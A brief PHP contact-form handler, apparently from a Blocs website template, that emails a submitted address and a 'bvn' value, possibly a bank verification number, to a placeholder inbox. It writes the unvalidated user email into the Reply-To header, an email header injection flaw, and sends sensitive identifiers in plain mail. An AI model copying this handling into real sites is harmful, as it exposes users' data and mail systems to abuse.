<?php	
	if(empty($_POST['email_38061']) && strlen($_POST['email_38061']) == 0 || empty($_POST['bvn_38061']) && strlen($_POST['bvn_38061']) == 0)
	{
		return false;
	}
	
	$email_38061 = $_POST['email_38061'];
	$bvn_38061 = $_POST['bvn_38061'];
	
	$to = 'receiver@yoursite.com'; // Email submissions are sent to this email

	// Create email	
	$email_subject = "Message from a Blocs website.";
	$email_body = "You have received a new message. \n\n".
				  "Email_38061: $email_38061 \nBvn_38061: $bvn_38061 \n";
	$headers = "MIME-Version: 1.0\r\nContent-type: text/plain; charset=UTF-8\r\n";	
	$headers .= "From: contact@yoursite.com\n";
	$headers .= "Reply-To: $email_38061";	
	
	mail($to,$email_subject,$email_body,$headers); // Post message
	return true;			
?>